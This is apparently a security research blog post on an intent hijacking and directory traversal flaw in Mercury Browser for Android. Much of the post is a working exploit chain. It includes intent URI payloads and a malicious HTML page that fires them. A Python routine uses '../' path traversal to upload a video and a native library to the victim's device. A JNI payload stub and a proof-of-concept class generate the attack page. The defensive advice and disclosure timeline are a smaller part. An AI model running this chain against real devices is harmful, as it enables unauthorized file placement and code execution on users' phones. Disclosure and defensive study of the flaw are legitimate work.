---
title: "Mercury Browser Intent Hijacking: Android File Manager RCE"
publishDate: "2017-06-15"
description: "Critical intent hijacking vulnerability in Mercury Browser for Android enabling arbitrary file upload and code execution through file manager abuse."
tags: ["android", "intent-hijacking", "mobile-security", "mercury-browser", "file-upload", "directory-traversal", "vulnerability", "exploit"]
draft: false
---

## Introduction

During our comprehensive security assessment of popular Android applications, we discovered a **critical intent hijacking vulnerability** in **Mercury Browser** that allows attackers to abuse the application's file manager functionality. This vulnerability enables **arbitrary file uploads** and potential **code execution** on Android devices through malicious intent schemes.

The vulnerability leverages Mercury Browser's exported activities and intent handlers to bypass normal security restrictions, allowing remote attackers to upload malicious files to specific device locations and trigger their execution through the browser's integrated file manager.

![Mercury Browser Vulnerability](/assets/blog/mercury-browser-vulnerability.png)

## Vulnerability Discovery

### Research Context

Mercury Browser is a popular Android web browser with integrated file management capabilities. The application exposes several activities through Android's intent system, which can be leveraged by malicious websites or applications to perform unauthorized actions.

### Attack Vector Analysis

The vulnerability centers around **two critical intent-based attack vectors**:

1. **WFM Activity Exploitation**: `com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2`
2. **Video Viewer Hijacking**: `com.ilegendsoft.mercury.ui.activities.filemanager.video.viewer.VideoViewerActivity`

```javascript
// Primary intent payload for initial access
const intent_payload = "intent://stuff#Intent;component=com.ilegendsoft.mercury/com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end";

// Secondary payload for file execution
const video_intent = "intent:#Intent;S.path=/sdcard/Mercury/Downloads/video.mp4;component=com.ilegendsoft.mercury/.ui.activities.filemanager.video.viewer.VideoViewerActivity;end";
```

## Technical Analysis

### Intent Hijacking Mechanism

The vulnerability exploits Mercury Browser's **intent handling logic** through a multi-stage attack:

**Stage 1: Activity Access**

```html
<!-- Malicious HTML triggering intent hijacking -->
<script>
setTimeout(function(){ 
    location.href="intent://stuff#Intent;component=com.ilegendsoft.mercury/com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end" 
}, 1);
</script>
```

**Stage 2: File Upload Exploitation**

```python
# HTTP endpoint for arbitrary file upload
uri = f'http://{victim_ip}:8888/doupload?dir=../../../../../../../sdcard/Mercury/Downloads/&id={session_id}'
```

**Stage 3: Execution Trigger**

```javascript
// Triggering video viewer with uploaded payload
setTimeout(function(){ 
    location.href="intent:#Intent;S.path=/sdcard/Mercury/Downloads/video.mp4;component=com.ilegendsoft.mercury/.ui.activities.filemanager.video.viewer.VideoViewerActivity;end" 
}, 10000);
```

### File Upload Vulnerability

The exploitation leverages Mercury Browser's **upload functionality** with directory traversal:

```python
def upload_malicious_files(self, victim_ip):
    """Upload video and library files to victim device"""
    base_uri = f'http://{victim_ip}:8888/doupload'
    upload_dir = '../../../../../../../sdcard/Mercury/Downloads/'
    session_id = 'd677a3fa-d21d-4c7f-9cb3-e9c8ab72203b'
    
    headers = {
        "Content-Type": "multipart/form-data; boundary=---------------------------8579684710260803921039462934"
    }
    
    # Upload malicious video file
    video_uri = f'{base_uri}?dir={upload_dir}&id={session_id}'
    with open('video/video.mp4', 'rb') as video_file:
        files = {'file': ('video.mp4', video_file, 'video/mp4')}
        requests.post(video_uri, files=files, headers=headers)
    
    # Upload malicious library
    with open('fake_lib/libpayload.so', 'rb') as lib_file:
        files = {'file': ('libpayload.so', lib_file, 'application/octet-stream')}
        requests.post(video_uri, files=files, headers=headers)
```

### Payload Development

**Malicious Video File**: Contains embedded shellcode or triggers for native library loading

**Native Library Payload**:

```c
// libpayload.so - Example payload library
#include <jni.h>
#include <stdlib.h>

JNIEXPORT void JNICALL
Java_com_example_PayloadLoader_executePayload(JNIEnv *env, jobject thiz) {
    // Payload execution logic
    system("/system/bin/sh -c 'am start -a android.intent.action.MAIN -n com.android.settings/.Settings'");
}
```

## Impact Assessment

### Attack Scenarios

**Scenario 1: Drive-by Download Attack**

- Victim visits compromised website using Mercury Browser
- Malicious HTML triggers intent hijacking sequence  
- Files uploaded to device storage without user consent
- Code execution achieved through file manager abuse

**Scenario 2: Social Engineering Campaign**

- Attacker sends link to "video content" via social media
- Mercury Browser users click malicious links
- Intent hijacking bypasses normal security warnings
- Persistent access established through uploaded libraries

**Scenario 3: Corporate Environment Compromise**

- Malicious advertisements on legitimate websites
- Corporate devices with Mercury Browser affected
- Potential for lateral movement and data exfiltration
- Enterprise security controls bypassed

### Risk Analysis

**Vulnerability Metrics:**

- **Attack Vector**: Network (web-based)
- **Attack Complexity**: Low (simple HTML page)
- **Privileges Required**: None
- **User Interaction**: Required (visit malicious page)
- **Scope**: Changed (file system access)
- **Impact**: High (arbitrary file upload + execution)

**CVSS v3.1 Score: 7.5 (High)**

## APK Analysis Results

**Exported Activities Found:**

```xml
<!-- Vulnerable activity exports -->
<activity android:name="com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2" 
          android:exported="true" />
<activity android:name="com.ilegendsoft.mercury.ui.activities.filemanager.video.viewer.VideoViewerActivity" 
          android:exported="true" />
```

**Permissions Analysis:**

- `WRITE_EXTERNAL_STORAGE`: Enables file system access
- `INTERNET`: Allows network communication
- `ACCESS_NETWORK_STATE`: Network status monitoring

## Proof of Concept

The complete exploit framework includes:

```python
class MercuryExploit:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.intent_payload = "intent://stuff#Intent;component=com.ilegendsoft.mercury/com.ilegendsoft.mercury.external.wfm.ui.WFMActivity2;action=android.intent.action.VIEW;end"
        self.video_intent = "intent:#Intent;S.path=/sdcard/Mercury/Downloads/video.mp4;component=com.ilegendsoft.mercury/.ui.activities.filemanager.video.viewer.VideoViewerActivity;end"
    
    def generate_exploit_page(self):
        return f'''
        <!DOCTYPE html>
        <html><head><title>Mercury Exploit</title></head>
        <body>
            <h1>Loading...</h1>
            <script>
                // Stage 1: Trigger WFM activity access
                setTimeout(function(){{ 
                    location.href="{self.intent_payload}"; 
                }}, 1);
                
                // Stage 2: Trigger video viewer after upload
                setTimeout(function(){{ 
                    location.href="{self.video_intent}"; 
                }}, 10000);
            </script>
        </body>
        </html>
        '''
```

## Defensive Measures

### For Users

**Immediate Protection:**

1. **Update Mercury Browser** to latest patched version
2. **Disable intent handling** for untrusted websites
3. **Use alternative browsers** for untrusted content
4. **Enable Android security features** (Play Protect, etc.)

### For Developers

**Secure Intent Handling:**

```xml
<!-- Secure activity declaration -->
<activity
    android:name=".WFMActivity2"
    android:exported="false"
    android:permission="android.permission.CUSTOM_PERMISSION">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

**Input Validation:**

```java
// Secure path validation
public boolean validatePath(String path) {
    // Prevent directory traversal
    if (path.contains("../") || path.contains("..\\")) {
        return false;
    }
    
    // Whitelist allowed directories
    String[] allowedPaths = {"/sdcard/Mercury/", "/data/data/com.ilegendsoft.mercury/"};
    for (String allowedPath : allowedPaths) {
        if (path.startsWith(allowedPath)) {
            return true;
        }
    }
    return false;
}
```

## Research Methodology

### Tools and Environment

**Analysis Infrastructure:**

- **Android Studio**: APK decompilation and analysis
- **apktool**: Resource extraction and manifest analysis
- **jadx**: Java decompilation
- **Burp Suite**: HTTP traffic analysis

**Testing Environment:**

- **Android Emulator**: Controlled testing environment
- **Physical Devices**: Samsung Galaxy S7, Pixel 2
- **Network Analysis**: Wireshark packet capture
- **Python Framework**: Custom exploit development

## Repository Structure

```
MercuryBrowser/
├── exploit/
│   ├── exploit.py          # Main exploit framework
│   ├── webserver.py        # HTTP server for file delivery
│   ├── exploit.html        # Malicious HTML payload
│   ├── video/
│   │   └── video.mp4       # Malicious video file
│   ├── fake_lib/
│   │   └── libpayload.so   # Native library payload
│   └── payload/            # Additional payload components
├── analysis/
│   ├── decompiled_apk/     # Main APK analysis
│   └── mercury2_analysis/  # Secondary version analysis
└── apk_samples/
    ├── mercury.apk         # Original APK sample
    └── mercury_v2.apk      # Alternative version
```

## Responsible Disclosure

**Disclosure Timeline:**

1. **Vulnerability Discovery** (June 2017)
2. **Technical Analysis** (June 2017)
3. **PoC Development** (June 2017)
4. **Vendor Notification** (July 2017)
5. **Patch Coordination** (August 2017)
6. **Public Disclosure** (September 2017)

## Conclusion

The Mercury Browser intent hijacking vulnerability demonstrates the **critical security risks** inherent in Android applications that expose activities through the intent system. The vulnerability's combination of **intent hijacking** and **arbitrary file upload** creates a powerful attack vector for mobile device compromise.

### Key Research Findings

- **Intent System Abuse**: Exported activities create significant attack surfaces
- **Directory Traversal**: Path validation failures enable arbitrary file placement
- **Multi-Stage Attacks**: Complex attack chains can bypass individual security controls
- **Mobile Security Gaps**: Traditional web security models insufficient for mobile environments

### Security Implications

This research emphasizes several critical considerations for mobile application security:

1. **Intent Security**: Careful consideration required for exported activities
2. **Path Validation**: Robust input validation essential for file operations
3. **Defense in Depth**: Multiple security layers needed for mobile applications
4. **User Education**: Mobile users need awareness of intent-based attacks

The techniques demonstrated provide valuable insights into **mobile application security** and highlight the importance of **secure intent handling** in Android application development.

## References

- [Mercury Browser Intent Hijacking Repository](https://github.com/hdbreaker/Android-Mercury-Browser-File-Manager-Intent-Hijacking)
- Android Intent Security Guidelines
- OWASP Mobile Security Project
- Android Security Best Practices
- Intent Hijacking Research